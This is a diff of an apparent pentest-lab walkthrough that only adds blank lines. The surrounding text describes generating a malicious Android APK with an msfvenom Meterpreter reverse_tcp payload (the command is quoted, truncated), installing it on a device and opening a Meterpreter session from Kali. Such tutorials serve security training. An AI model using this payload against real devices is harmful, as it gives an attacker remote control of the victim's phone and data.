@@ -110,6 +110,8 @@ Terminal: msfvenom -a java --platform android -p android/meterpreter/reverse_tcp
 <img width="491" alt="image" src="https://user-images.githubusercontent.com/58047550/221259681-0f295a07-3ff1-4954-a78e-7266edac284c.png">
 
 APK file created successfully
+
+
 <img width="440" alt="image" src="https://user-images.githubusercontent.com/58047550/221259694-d9db810a-a810-4511-a5b7-81aab5f88ddb.png">
 
 Malicious .apk file ready to install
@@ -215,12 +217,15 @@ Step 8:
 
  
 ■	Installing the application into an Android device
+
 <img width="175" alt="image" src="https://user-images.githubusercontent.com/58047550/221260469-32463145-2eac-456a-a5ee-0e2c39d0ce61.png">
 
 ■	Once the user allows the app to access the features and click on install.
  
 
 ■	Android starts the installation of the app and once installed the user can see the app in the device named as MainActivity and can just click on the app to start using it.
+
+
 <img width="194" alt="image" src="https://user-images.githubusercontent.com/58047550/221260523-17195aa8-1647-4fd3-b5c2-2379bab5e736.png">
 
 ■	After complete installation, we are going back to the Kali machine and start the Meterpreter session.
